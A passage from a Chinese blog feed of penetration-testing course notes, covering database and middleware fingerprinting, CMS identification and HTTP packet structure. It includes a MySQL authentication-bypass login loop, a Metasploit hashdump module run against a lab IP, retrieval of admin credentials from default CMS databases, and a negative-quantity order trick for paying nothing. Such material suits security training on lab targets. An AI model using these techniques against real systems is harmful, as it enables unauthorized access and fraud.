class="line">db2 5000</span><br><span class="line">Derby 1521</span><br><span class="line">pgsql 5432</span><br><span class="line">ponitbase 9092</span><br></pre></td></tr></table></figure><h4 id="数据库类型区别及识别意义"><a href="#数据库类型区别及识别意义" class="headerlink" title="数据库类型区别及识别意义"></a>数据库类型区别及识别意义</h4><p>数据库不同，结构也不同。产生的漏洞也不同，攻击手法也不同</p><h4 id="数据库常见漏洞类型及攻击"><a href="#数据库常见漏洞类型及攻击" class="headerlink" title="数据库常见漏洞类型及攻击"></a>数据库常见漏洞类型及攻击</h4><p>弱口令，通过弱口令获取admin账户密码。</p><h4 id="简要数据库层面漏洞影响范围"><a href="#简要数据库层面漏洞影响范围" class="headerlink" title="简要数据库层面漏洞影响范围"></a>简要数据库层面漏洞影响范围</h4><p>通过漏洞，进行攻击，也可以获取数据库的相关权限，进行一系列的操作</p><h3 id="第三方层面"><a href="#第三方层面" class="headerlink" title="第三方层面"></a>第三方层面</h3><p>常见第三方软件：</p><p>Jboss，PHPmyadmin，vsftpd，teamview等</p><h4 id="如何判断有哪些第三方平台和软件"><a href="#如何判断有哪些第三方平台和软件" class="headerlink" title="如何判断有哪些第三方平台和软件"></a>如何判断有哪些第三方平台和软件</h4><p>通过nmap端口扫描来判断。</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211045148.png" alt="image-20210921104504055"></p><h4 id="简述为什么要识别第三方平台或软件"><a href="#简述为什么要识别第三方平台或软件" class="headerlink" title="简述为什么要识别第三方平台或软件"></a>简述为什么要识别第三方平台或软件</h4><p>通过识别第三方软件，来找出漏洞，从而进行渗透测试</p><h4 id="常见第三方平台或软件漏洞类型及攻击"><a href="#常见第三方平台或软件漏洞类型及攻击" class="headerlink" title="常见第三方平台或软件漏洞类型及攻击"></a>常见第三方平台或软件漏洞类型及攻击</h4><p>弱口令攻击、漏洞攻击</p><h4 id="简述第三方平台或软件安全测试的范围"><a href="#简述第三方平台或软件安全测试的范围" class="headerlink" title="简述第三方平台或软件安全测试的范围"></a>简述第三方平台或软件安全测试的范围</h4><p>影响权限</p><h4 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h4><p>除去常见WEB安全及APP安全测试外，类似服务器单一或复杂的其他服务（邮件、游戏、负载均衡等），也可以作为安全测试目标，此类目标测试原则只是少了WEB应用或其他安全问题。所以明确安全测试思路是很重要的！</p><h3 id="案例演示"><a href="#案例演示" class="headerlink" title="案例演示"></a>案例演示</h3><h4 id="某数据库弱口令及漏洞演示"><a href="#某数据库弱口令及漏洞演示" class="headerlink" title="某数据库弱口令及漏洞演示"></a>某数据库弱口令及漏洞演示</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up -d</span><br><span class="line">docker network ls 查看当前docker网络</span><br><span class="line">docker network rm 592a344d1cbb 删除某一个docker网络 </span><br><span class="line">注：其中 NAME为bridge、host、none为内置的docker网络，无法删除</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211044507.png" alt="image-20210817195810376"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for i in `seq 1 1000`; do mysql -uroot -pwrong -h your-ip -P3306 ; done</span><br></pre></td></tr></table></figure><p>成功登录到数据库。</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211044514.png" alt="image-20210817200553278"></p><p>关闭容器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose down </span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211044511.png" alt="image-20210817200758620"></p><p>另一种方式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use auxiliary/scanner/mysql/mysql_authbypass_hashdump</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211044269.png" alt="image-20210817201559900"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set rhosts 10.6.25.48</span><br><span class="line">set threads 10</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211044465.png" alt="image-20210817201926839"></p><h4 id="某第三方应用安全漏洞演示"><a href="#某第三方应用安全漏洞演示" class="headerlink" title="某第三方应用安全漏洞演示"></a>某第三方应用安全漏洞演示</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211044468.png" alt="image-20210817204322409"></p><p>bp抓一下包</p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211045667.png" alt="image-20210921104520576" style="zoom:80%;" /><p>成功利用</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211045653.png" alt="image-20210921104532528"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> 小迪学习笔记 </tag>
            
            <tag> 基础入门 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>04基础入门--WEB源码拓展</title>
      <link href="/2021/09/21/04%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8-WEB%E6%BA%90%E7%A0%81%E6%8B%93%E5%B1%95/"/>
      <url>/2021/09/21/04%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8-WEB%E6%BA%90%E7%A0%81%E6%8B%93%E5%B1%95/</url>
      
        <content type="html"><![CDATA[<p>😆😆😆😆😆😆</p><span id="more"></span><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>WEB源码在安全测试中是非常重要的信息来源，可以用来代码审计漏洞也可以用来做信息突破口，其中WEB源码有很多技术需要简明分析。比如:获取某 ASP源码后可以采用默认数据库下载为突破，获取某其他脚本源码漏洞可以进行代码审计挖掘或分析其业务逻辑等，总之源码的获取将为后期的安全测试提供了更多的思路。</p><h3 id="关于-WEB-源码目录结构"><a href="#关于-WEB-源码目录结构" class="headerlink" title="关于 WEB 源码目录结构"></a>关于 WEB 源码目录结构</h3><p>数据库配置文件，后台目录，模版目录，数据库目录等</p><h3 id="关于-WEB-源码脚本类型"><a href="#关于-WEB-源码脚本类型" class="headerlink" title="关于 WEB 源码脚本类型"></a>关于 WEB 源码脚本类型</h3><p>ASP,PHP,ASPX,JSP,JAVAWEB 等脚本类型源码安全问题</p><h3 id="关于-WEB-源码应用分类"><a href="#关于-WEB-源码应用分类" class="headerlink" title="关于 WEB 源码应用分类"></a>关于 WEB 源码应用分类</h3><p>社交，论坛，门户，第三方，博客等不同的代码机制对应漏洞</p><h3 id="关于-WEB-源码其他说明"><a href="#关于-WEB-源码其他说明" class="headerlink" title="关于 WEB 源码其他说明"></a>关于 WEB 源码其他说明</h3><p>开源，未开源问题，框架非框架问题，关于 CMS 识别问题及后续等</p><h3 id="关于源码获取的相关途径"><a href="#关于源码获取的相关途径" class="headerlink" title="关于源码获取的相关途径"></a>关于源码获取的相关途径</h3><p>搜索，咸鱼淘宝，第三方源码站，各种行业对应</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>关注应用分类及脚本类型估摸出可能存在的漏洞（其中框架类例外），在获取源码后可进行本地安全测试<br>或代码审计，也可以分析其目录工作原理（数据库备份，bak 文件等），未获取到的源码采用各种方法想<br>办法获取！</p><h3 id="演示案例"><a href="#演示案例" class="headerlink" title="演示案例"></a>演示案例</h3><h4 id="ASP-PHP-等源码下安全测试"><a href="#ASP-PHP-等源码下安全测试" class="headerlink" title="ASP,PHP 等源码下安全测试"></a>ASP,PHP 等源码下安全测试</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">平台识别-某CMS无漏洞-默认数据库</span><br><span class="line">平台识别-某CMS有漏洞-漏洞利用</span><br></pre></td></tr></table></figure><p>通过后缀我们清楚看的到时asp后缀，说明是asp网站。</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211041929.png" alt="image-20210921104106754"></p><p>可以清楚的看到XYcms的字样，说明用的cms是xycms。</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211041010.png" alt="image-20210921104121765"></p><p>下载XYCMS源码</p><img src="D:\Typora\学习笔记\images\image-20210817155002433.png" alt="image-20210817155002433" style="zoom:80%;" /><p>找到他的数据库文件</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211041530.png" alt="image-20210921104129458"></p><p>打开数据库文件发现该文件里有管理员账号密码</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211041589.png" alt="image-20210921104138501"></p><p>访问网站后台</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211040356.png" alt="image-20210817155420723"></p><h4 id="手工识别CMS"><a href="#手工识别CMS" class="headerlink" title="手工识别CMS"></a>手工识别CMS</h4><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211041299.png" alt="image-20210921104150196"></p><p>metinfoCMS</p><p>搜索相关漏洞</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211041023.png" alt="image-20210921104156947"></p><h4 id="字典识别"><a href="#字典识别" class="headerlink" title="字典识别"></a>字典识别</h4><p>字典</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211040373.png" alt="image-20210817160504582"></p><p>下载对应的文件。</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211040360.png" alt="image-20210817160757659"></p><p>查看其md5</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil -hashfile 新建文本文档.txt MD5</span><br></pre></td></tr></table></figure><p>另一种下载文件</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211040376.png" alt="image-20210817161255733"></p><p>通过迅雷下载</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211042311.png" alt="image-20210921104211226"></p><h4 id="在线CMS识别"><a href="#在线CMS识别" class="headerlink" title="在线CMS识别"></a>在线CMS识别</h4><p><a href="http://whatweb.bugscaner.com/look/">http://whatweb.bugscaner.com/look/</a></p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211042275.png" alt="image-20210921104220210"></p><p><a href="https://www.yunsee.cn/">https://www.yunsee.cn/</a></p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211040189.png" alt="image-20210817161641522"></p><h4 id="源码引用分类下的针对漏洞"><a href="#源码引用分类下的针对漏洞" class="headerlink" title="源码引用分类下的针对漏洞"></a>源码引用分类下的针对漏洞</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">niushop电商类关注漏洞点-业务逻辑</span><br></pre></td></tr></table></figure><p>查看电商网站业务逻辑</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211040686.png" alt="image-20210817161847467"></p><p>抓包</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211042817.png" alt="image-20210921104238693"></p><p>正常发出</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211042690.png" alt="image-20210921104249613"></p><p>将num修改为-1</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211042860.png" alt="image-20210921104256734"></p><p>可以看到需要支付0元，直接白嫖</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211040733.png" alt="image-20210817162255631"></p><h4 id="简要目标从识别到源码获取"><a href="#简要目标从识别到源码获取" class="headerlink" title="简要目标从识别到源码获取"></a>简要目标从识别到源码获取</h4><p>本地演示个人博客-手工发现其CMS-漏洞搜索或下载分析</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211043890.png" alt="image-20210921104306803"></p><p>搜索特殊关键字，识别cms</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211040328.png" alt="image-20210817162538139"></p><p><a href="http://weipan.1016sangshen.cn/">http:weipan.1016sangshen.cn/</a> 内部搭建的靶场</p><p>人工爆框架-搜索特定URL-获取其他相符站点-漏洞测试</p><p>通过报错发现CMS，发现是thinkphp</p><p>搜索thinkphp的漏洞</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211040370.png" alt="image-20210817162822641"></p><p>借助特定行业源码或咸鱼进行搜索获取-本地搭建-代码审计或其他</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211043410.png" alt="image-20210921104319268"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> 小迪学习笔记 </tag>
            
            <tag> 基础入门 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>03基础入门--搭建安全拓展</title>
      <link href="/2021/09/21/03%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8-%E6%90%AD%E5%BB%BA%E5%AE%89%E5%85%A8%E6%8B%93%E5%B1%95/"/>
      <url>/2021/09/21/03%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8-%E6%90%AD%E5%BB%BA%E5%AE%89%E5%85%A8%E6%8B%93%E5%B1%95/</url>
      
        <content type="html"><![CDATA[<p>😆😆😆😆😆😆</p><span id="more"></span><h3 id="常见搭建平台（中间件）脚本启用"><a href="#常见搭建平台（中间件）脚本启用" class="headerlink" title="常见搭建平台（中间件）脚本启用"></a>常见搭建平台（中间件）脚本启用</h3><p>ASP,PHP,ASPX,JSP,PY,JAVAWEB等环境</p><h3 id="域名IP目录解析安全问题"><a href="#域名IP目录解析安全问题" class="headerlink" title="域名IP目录解析安全问题"></a>域名IP目录解析安全问题</h3><p>域名访问的是该网站的根目录，而IP是从域名的上一级开始访问的。扫描目录的时候，扫描IP会多扫出一些东西</p><h3 id="常见文件后缀解析对应安全"><a href="#常见文件后缀解析对应安全" class="headerlink" title="常见文件后缀解析对应安全"></a>常见文件后缀解析对应安全</h3><p>网站可能对一些文件的后缀名执行错误</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211039233.png" alt="image-20210921103916148"></p><h3 id="常见安全测试中的安全防护"><a href="#常见安全测试中的安全防护" class="headerlink" title="常见安全测试中的安全防护"></a>常见安全测试中的安全防护</h3><p>1.限制外部成员访问内部网站，限制IP地址规范访问权限</p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211039925.png" alt="image-20210921103923848" style="zoom:80%;" /><p>2.身份验证和访问控制</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211038957.png" alt="image-20210817151603904"></p><p>如果取消匿名访问，需要访问者输出用户名和密码才能访问。</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211038959.png" alt="image-20210817151704481"></p><p>3.限制IP地址访问</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211039705.png" alt="image-20210921103942640"></p><p>可以通过限制运行某一IP访问网站，或者拒绝某个IP访问网站。</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211039204.png" alt="image-20210921103951097"></p><h3 id="WEB源码中敏感文件"><a href="#WEB源码中敏感文件" class="headerlink" title="WEB源码中敏感文件"></a>WEB源码中敏感文件</h3><p>后台路径，数据库配置文件，备份文件等</p><h3 id="WEB-后门与用户及文件权限"><a href="#WEB-后门与用户及文件权限" class="headerlink" title="WEB 后门与用户及文件权限"></a>WEB 后门与用户及文件权限</h3><p>1.来宾用户一般是网站权限用户，禁止来宾用户权限，导致连接后门看不到任何东西。</p><p>2.通过将目录的读写权限中的写入权限拒绝，使我们虽然用后门连接成功，但是没有写入的权限。解决方法是换一个目录进行写入。</p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211039695.png" alt="image-20210921103959619" style="zoom:80%;" /><h3 id="演示案例"><a href="#演示案例" class="headerlink" title="演示案例"></a>演示案例</h3><h4 id="基于中间件的简要识别"><a href="#基于中间件的简要识别" class="headerlink" title="基于中间件的简要识别"></a>基于中间件的简要识别</h4><p>通过抓包查看中间件</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211038735.png" alt="image-20210817152924187"></p><h4 id="基于中间件的安全漏洞"><a href="#基于中间件的安全漏洞" class="headerlink" title="基于中间件的安全漏洞"></a>基于中间件的安全漏洞</h4><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211040092.png" alt="image-20210921104020027" style="zoom:80%;" /><h4 id="相关练习平台"><a href="#相关练习平台" class="headerlink" title="相关练习平台"></a>相关练习平台</h4><ul><li><a href="http://www.vulhub.org/">www.vulhub.org</a></li><li><a href="https://www.vulnhub.com/">https://www.vulnhub.com/</a></li></ul><h4 id="vulhub靶场"><a href="#vulhub靶场" class="headerlink" title="vulhub靶场"></a>vulhub靶场</h4><p>开启</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo docker-compose build</span><br><span class="line">sudo docker-compose up -d</span><br></pre></td></tr></table></figure><p>关闭</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker-compose down</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> 小迪学习笔记 </tag>
            
            <tag> 基础入门 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>02基础入门--数据包拓展</title>
      <link href="/2021/09/12/02%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8-%E6%95%B0%E6%8D%AE%E5%8C%85%E6%8B%93%E5%B1%95/"/>
      <url>/2021/09/12/02%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8-%E6%95%B0%E6%8D%AE%E5%8C%85%E6%8B%93%E5%B1%95/</url>
      
        <content type="html"><![CDATA[<p>😆😆😆😆😆😆</p><span id="more"></span><h3 id="网站解析对应"><a href="#网站解析对应" class="headerlink" title="网站解析对应"></a>网站解析对应</h3><h4 id="简要网站搭建过程"><a href="#简要网站搭建过程" class="headerlink" title="简要网站搭建过程"></a>简要网站搭建过程</h4><p><a href="https://www.cnblogs.com/GodSince/p/12010184.html">https://www.cnblogs.com/GodSince/p/12010184.html</a></p><h4 id="涉及到的攻击层面？"><a href="#涉及到的攻击层面？" class="headerlink" title="涉及到的攻击层面？"></a>涉及到的攻击层面？</h4><p>源码，搭建平台，系统，网络层等</p><h4 id="涉及到的安全问题？"><a href="#涉及到的安全问题？" class="headerlink" title="涉及到的安全问题？"></a>涉及到的安全问题？</h4><p>目录，敏感文件，弱口令，IP 及域名等</p><h3 id="HTTP-S数据包"><a href="#HTTP-S数据包" class="headerlink" title="HTTP/S数据包"></a>HTTP/S数据包</h3><p>Request请求数据包</p><p>Response返回数据包</p><p><img src="https://p.pstatp.com/origin/pgc-image/6531c95e858442ef8b03c11046995819"></p><p>Request请求数据包</p><p>Proxy代理服务器 </p><p>Response返回数据包</p><p><img src="https://p.pstatp.com/origin/pgc-image/99fae3708d554786a1045757054e7c35"></p><h3 id="关于HTTP和HTTPS"><a href="#关于HTTP和HTTPS" class="headerlink" title="关于HTTP和HTTPS"></a>关于HTTP和HTTPS</h3><p>HTTP（HyperText Transfer Protocol：超文本传输协议）是一种用于分布式、协作式和超媒体信息系统的应用层协议。 简单来说就是一种发布和接收 HTML 页面的方法，被用于在 Web 浏览器和网站服务器之间传递信息。</p><p>HTTP 默认工作在 TCP 协议 80 端口，用户访问网站 http:// 打头的都是标准 HTTP 服务。</p><p>HTTP 协议以明文方式发送内容，不提供任何方式的数据加密，如果攻击者截取了Web浏览器和网站服务器之间的传输报文，就可以直接读懂其中的信息，因此，HTTP协议不适合传输一些敏感信息，比如：信用卡号、密码等支付信息。</p><p>HTTPS（Hypertext Transfer Protocol Secure：超文本传输安全协议）是一种透过计算机网络进行安全通信的传输协议。HTTPS 经由 HTTP 进行通信，但利用 SSL/TLS 来加密数据包。HTTPS 开发的主要目的，是提供对网站服务器的身份认证，保护交换数据的隐私与完整性。</p><p>HTTPS 默认工作在 TCP 协议443端口，它的工作流程一般如以下方式：</p><ul><li>1、TCP 三次同步握手</li><li>2、客户端验证服务器数字证书</li><li>3、DH 算法协商对称加密算法的密钥、hash 算法的密钥</li><li>4、SSL 安全加密隧道协商完成</li><li>5、网页以加密的方式传输，用协商的对称加密算法和密钥加密，保证数据机密性；用协商的hash算法进行数据完整性保护，保证数据不被篡改。</li></ul><p>HTTP和HTTPS的简要通信过程</p><p>HTTP：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">建立连接——&gt;发送请求数据包——&gt;返回响应数据包——&gt;关闭连接</span><br><span class="line">1.浏览器建立与 web 服务器之间的连接</span><br><span class="line">2.浏览器将请求数据打包（生成请求数据包）并发送到 web 服务器</span><br><span class="line">3.web 服务器将处理结果打包（生成响应数据包）并发送给浏览器</span><br><span class="line">4.web 服务器关闭连接</span><br></pre></td></tr></table></figure><p>HTTPS：</p><img src="https://p.pstatp.com/origin/pgc-image/3a7a4f0e9fc94b1aae716f713fbe8184" style="zoom:67%;" /><h3 id="HTTP-HTTPS-具体区别？"><a href="#HTTP-HTTPS-具体区别？" class="headerlink" title="HTTP/HTTPS 具体区别？"></a>HTTP/HTTPS 具体区别？</h3><ul><li>HTTP 明文传输，数据都是未加密的，安全性较差，HTTPS（SSL+HTTP） 数据传输过程是加密的，安全性较好。</li><li>使用 HTTPS 协议需要到 CA（Certificate Authority，数字证书认证机构） 申请证书，一般免费证书较少，因而需要一定费用。证书颁发机构如：Symantec、Comodo、GoDaddy 和 GlobalSign 等。</li><li>HTTP 页面响应速度比 HTTPS 快，主要是因为 HTTP 使用 TCP 三次握手建立连接，客户端和服务器需要交换 3 个包，而 HTTPS除了 TCP 的三个包，还要加上 ssl 握手需要的 9 个包，所以一共是 12 个包。</li><li>http 和 https 使用的是完全不同的连接方式，用的端口也不一样，前者是 80，后者是 443。</li><li>HTTPS 其实就是建构在 SSL/TLS 之上的 HTTP 协议，所以，要比较 HTTPS 比 HTTP 要更耗费服务器资源。</li></ul><h3 id="Request-请求数据包数据格式"><a href="#Request-请求数据包数据格式" class="headerlink" title="Request 请求数据包数据格式"></a>Request 请求数据包数据格式</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">请求行：请求类型/请求资源路径、协议的版本和类型</span><br><span class="line">请求头：一些键值对，浏览器与 web 服务器之间都可以发送，特定的某种含义</span><br><span class="line">空行：请求头与请求体之间用一个空行隔开；</span><br><span class="line">请求体：要发送的数据(一般 post 提交会使用)；例：user=123&amp;pass=123</span><br></pre></td></tr></table></figure><p>例如：Request Headers</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /adduser HTTP/1.1</span><br><span class="line">Host: localhost:8030</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Content-Length: 16</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Origin: chrome-extension://fdmmgilgnpjigdojojpjoooidkmcomcm</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)</span><br><span class="line">Chrome/66.0.3359.181 Safari/537.36</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br></pre></td></tr></table></figure><h4 id="请求行"><a href="#请求行" class="headerlink" title="请求行"></a>请求行</h4><p>请求行由三个标记组成：请求方法、请求 URL 和 HTTP 版本，它们用空格分享。</p><p>例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /index.html HTTP/1.1</span><br></pre></td></tr></table></figure><p>HTTP 规划定义了 8 种可能的请求方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">GET：检索 URL 中标识资源的一个简单请求</span><br><span class="line">HEAD：与 GET 方法相同，服务器只返回状态行和头标，并不返回请求文档</span><br><span class="line">POST：服务器接受被写入客户端输出流中的数据的请求</span><br><span class="line">PUT：服务器保存请求数据作为指定 URL 新内容的请求</span><br><span class="line">DELETE：服务器删除 URL 中命令的资源的请求</span><br><span class="line">OPTIONS：关于服务器支持的请求方法信息的请求</span><br><span class="line">TRACE：web 服务器反馈 Http 请求和其头标的请求</span><br><span class="line">CONNECT ：已文档化，但当前未实现的一个方法，预留做隧道处理</span><br></pre></td></tr></table></figure><h4 id="请求头"><a href="#请求头" class="headerlink" title="请求头"></a>请求头</h4><p>由关键字/值对组成，每行一对，关键字和值用冒号分享。请求头标通知服务器腾于客户端的功能和标识。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">HOST: 主机或域名地址</span><br><span class="line">Accept：指浏览器或其他客户可以接爱的 MIME 文件格式。Servlet 可以根据它判断并返回适当的文件格式。</span><br><span class="line">User-Agent：是客户浏览器名称</span><br><span class="line">Host：对应网址 URL 中的 Web 名称和端口号。</span><br><span class="line">Accept-Langeuage：指出浏览器可以接受的语言种类，如 en 或 en-us，指英语。</span><br><span class="line">connection：用来告诉服务器是否可以维持固定的 HTTP 连接。http 是无连接的，HTTP/1.1 使用 Keep-Alive</span><br><span class="line">为默认值，这样，当浏览器需要多个文件时(比如一个 HTML 文件和相关的图形文件)，不需要每次都建立连接</span><br><span class="line">Cookie：浏览器用这个属性向服务器发送 Cookie。Cookie 是在浏览器中寄存的小型数据体，它可以记载和服务器相关的用户信息，也可以用来实现会话功能。</span><br><span class="line">Referer：表明产生请求的网页URL。如比从网页/icconcept/index.jsp中点击一个链接到网页</span><br><span class="line">/icwork/search ， 在 向 服 务 器 发 送 的 GET/icwork/search 中 的 请 求 中 ， Referer 是</span><br><span class="line">http://hostname:8080/icconcept/index.jsp。这个属性可以用来跟踪 Web 请求是从什么网站来的。</span><br><span class="line">Content-Type：用来表名 request 的内容类型。可以用 HttpServletRequest 的 getContentType()方法取得。</span><br><span class="line">Accept-Charset：指出浏览器可以接受的字符编码。英文浏览器的默认值是 ISO-8859-1.</span><br><span class="line">Accept-Encoding：指出浏览器可以接受的编码方式。编码方式不同于文件格式，它是为了压缩文件并加速文件传递速度。浏览器在接收到 Web 响应之后先解码，然后再检查文件格式。</span><br></pre></td></tr></table></figure><h4 id="空行"><a href="#空行" class="headerlink" title="空行"></a>空行</h4><p>最后一个请求头标之后是空行，发送回车符和退行，通知服务器以下不再有头标。</p><h4 id="请求数据"><a href="#请求数据" class="headerlink" title="请求数据"></a>请求数据</h4><p>使用 POST 传送，最常使用的是 Content-Type 和 Content-Length 头标。</p><h3 id="Response-返回数据包数据格式"><a href="#Response-返回数据包数据格式" class="headerlink" title="Response 返回数据包数据格式"></a>Response 返回数据包数据格式</h3><p>一个响应由四个部分组成；状态行、响应头标、空行、响应数据。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">状态行：协议版本、数字形式的状态代码和状态描述，个元素之间以空格分隔</span><br><span class="line">响应头标：包含服务器类型、日期、长度、内容类型等</span><br><span class="line">空行：响应头与响应体之间用空行隔开</span><br><span class="line">响应数据：浏览器会将实体内容中的数据取出来，生成相应的页面</span><br></pre></td></tr></table></figure><h4 id="HTTP-响应码："><a href="#HTTP-响应码：" class="headerlink" title="HTTP 响应码："></a>HTTP 响应码：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1xx：信息，请求收到，继续处理</span><br><span class="line">2xx：成功，行为被成功地接受、理解和采纳</span><br><span class="line">3xx：重定向，为了完成请求，必须进一步执行的动作</span><br><span class="line">4xx：客户端错误</span><br><span class="line">5xx：服务器错误</span><br></pre></td></tr></table></figure><h4 id="响应头标"><a href="#响应头标" class="headerlink" title="响应头标"></a>响应头标</h4><p>想请求头标一样，他们指出服务器的功能，标识出响应数据的细节</p><h4 id="空行-1"><a href="#空行-1" class="headerlink" 